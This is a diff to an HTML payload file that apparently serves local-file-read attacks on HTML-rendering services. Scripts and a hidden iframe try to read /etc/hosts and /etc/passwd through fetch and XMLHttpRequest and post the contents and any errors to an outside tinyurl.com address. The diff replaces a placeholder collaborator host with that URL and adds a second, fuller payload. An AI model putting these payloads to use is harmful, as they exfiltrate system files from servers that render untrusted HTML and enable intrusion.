@@ -18,7 +18,26 @@
     // Fallback to XHR
     const xhr = new XMLHttpRequest();
     xhr.open('GET', 'file:///etc/hosts', true);
-    xhr.onload = () => fetch('https://YOUR-COLLAB.oastify.com/xhr', { body: xhr.responseText });
+    xhr.onload = () => fetch('https://tinyurl.com/vvh5tkem/xhr', { body: xhr.responseText });
+    xhr.send();
+  </script>
+</body>
+</html>
+
+<!DOCTYPE html>
+<body>
+  <iframe src="file:///etc/passwd" style="display:none"></iframe>
+  <script>
+    // Attempt to read via fetch()
+    fetch('file:///etc/hosts')
+      .then(r => r.text())
+      .then(d => fetch('https://tinyurl.com/vvh5tkem/exfil', { method: 'POST', body: d }))
+      .catch(e => fetch('https://tinyurl.com/vvh5tkem/error', { body: e.message }));
+
+    // Fallback to XHR
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', 'file:///etc/passwd', true);
+    xhr.onload = () => fetch('https://tinyurl.com/vvh5tkem/xhr', { body: xhr.responseText });
     xhr.send();
   </script>
 </body>
